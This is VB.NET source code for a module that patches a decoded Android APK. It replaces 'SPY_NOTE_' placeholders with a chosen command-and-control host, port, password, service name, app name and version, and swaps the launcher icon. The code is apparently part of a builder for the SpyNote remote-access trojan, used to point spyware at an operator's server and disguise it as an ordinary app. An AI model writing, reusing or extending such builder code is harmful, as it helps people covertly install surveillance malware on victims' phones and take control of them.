Imports System.IO
Imports System.IO.Compression
Imports System.Text
Imports System.Text.RegularExpressions

Public Module ApkBrandingPatcher

    Public Class ClientBrandingConfig
        Public IconPath As String
        Public Host As String
        Public AppName As String
        Public VersionName As String
        Public ClientName As String
        Public Port As String
        Public Password As String
        Public ServiceName As String
        Public Properties As String = ".."
        Public MergeFlag As String = ".."

        Public Function HasContent() As Boolean
            Return Not String.IsNullOrWhiteSpace(AppName) OrElse
                   Not String.IsNullOrWhiteSpace(Host) OrElse
                   Not String.IsNullOrWhiteSpace(IconPath)
        End Function
    End Class

    Public Function ApkContainsBrandingPlaceholders(apkPath As String) As Boolean
        Try
            If Not File.Exists(apkPath) Then Return False
            Using archive As System.IO.Compression.ZipArchive = System.IO.Compression.ZipFile.OpenRead(apkPath)
                For Each entry As ZipArchiveEntry In archive.Entries
                    If Not entry.FullName.EndsWith(".xml", StringComparison.OrdinalIgnoreCase) Then Continue For
                    Using reader As New StreamReader(entry.Open())
                        Dim text As String = reader.ReadToEnd()
                        If text.IndexOf("SPY_NOTE_", StringComparison.OrdinalIgnoreCase) >= 0 Then Return True
                    End Using
                Next
            End Using
        Catch
        End Try
        Return False
    End Function

    Public Sub ApplyBrandingToDecodeDir(decodeDir As String, cfg As ClientBrandingConfig, resourcesPath As String)
        If cfg Is Nothing OrElse Not cfg.HasContent() Then Return

        ReplaceBrandingPlaceholdersInTree(decodeDir, cfg)
        ApplyClientIcon(decodeDir, cfg.IconPath, resourcesPath)
    End Sub

    Private Sub ReplaceBrandingPlaceholdersInTree(root As String, cfg As ClientBrandingConfig)
        If Not Directory.Exists(root) Then Return

        Dim map As New Dictionary(Of String, String)(StringComparer.OrdinalIgnoreCase) From {
            {"[SPY_NOTE_APP_NAME_OK]", SafeValue(cfg.AppName, "App")},
            {"[SPY_NOTE_VERSION_OK]", SafeValue(cfg.VersionName, "1.0")},
            {"[SPY_NOTE_HOST_OK]", SafeValue(cfg.Host, "127.0.0.1")},
            {"[SPY_NOTE_PORT_OK]", SafeValue(cfg.Port, "7771")},
            {"[SPY_NOTE_CLIENT_NAME_OK]", SafeValue(cfg.ClientName, SafeValue(cfg.AppName, "Client"))},
            {"[SPY_NOTE_PASS_OK]", SafeValue(cfg.Password, "null")},
            {"[SPY_NOTE_SERVICE_NAME_OK]", SafeValue(cfg.ServiceName, "null")},
            {"[SPY_NOTE_PROPERTIES_OK]", SafeValue(cfg.Properties, "..")},
            {"[SPY_NOTE_MERGE_OK]", SafeValue(cfg.MergeFlag, "..")}
        }

        For Each filePath As String In Directory.GetFiles(root, "*.*", SearchOption.AllDirectories)
            Dim ext As String = Path.GetExtension(filePath).ToLowerInvariant()
            If ext <> ".xml" AndAlso ext <> ".yml" AndAlso ext <> ".yaml" AndAlso ext <> ".smali" Then Continue For
            Try
                Dim text As String = File.ReadAllText(filePath, Encoding.UTF8)
                Dim changed As Boolean = False
                For Each pair As KeyValuePair(Of String, String) In map
                    If text.IndexOf(pair.Key, StringComparison.OrdinalIgnoreCase) >= 0 Then
                        text = text.Replace(pair.Key, EscapeXmlValue(pair.Value))
                        changed = True
                    End If
                Next
                If changed Then
                    File.WriteAllText(filePath, text, New UTF8Encoding(False))
                End If
            Catch
            End Try
        Next
    End Sub

    Private Function SafeValue(value As String, fallback As String) As String
        If String.IsNullOrWhiteSpace(value) Then Return fallback
        Return value.Trim()
    End Function

    Private Function EscapeXmlValue(value As String) As String
        If value Is Nothing Then Return String.Empty
        Return value.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("""", "&quot;")
    End Function

    Public Sub ApplyClientIcon(decodeDir As String, iconPath As String, resourcesPath As String)
        Dim iconFile As String = iconPath
        If String.IsNullOrWhiteSpace(iconFile) OrElse Not File.Exists(iconFile) Then
            iconFile = Path.Combine(resourcesPath, "Icons", "devico", "gp.png")
        End If
        If Not File.Exists(iconFile) Then
            iconFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Icons", "devico", "gp.png")
        End If
        If Not File.Exists(iconFile) Then Return

        Dim densities As String() = {"mipmap-mdpi", "mipmap-hdpi", "mipmap-xhdpi", "mipmap-xxhdpi", "drawable-mdpi", "drawable-hdpi", "drawable-xhdpi", "drawable-xxhdpi"}
        For Each density As String In densities
            Dim dir As String = Path.Combine(decodeDir, "res", density)
            Directory.CreateDirectory(dir)
            System.IO.File.Copy(iconFile, Path.Combine(dir, "ic_launcher.png"), True)
        Next
    End Sub

    Public Function BuildBrandingConfigFromUi(iconPath As String, host As String, appName As String, versionName As String,
                                              clientName As String, port As String, password As String, serviceName As String) As ClientBrandingConfig
        Return New ClientBrandingConfig With {
            .IconPath = iconPath,
            .Host = host,
            .AppName = appName,
            .VersionName = versionName,
            .ClientName = clientName,
            .Port = port,
            .Password = password,
            .ServiceName = serviceName
        }
    End Function

End Module
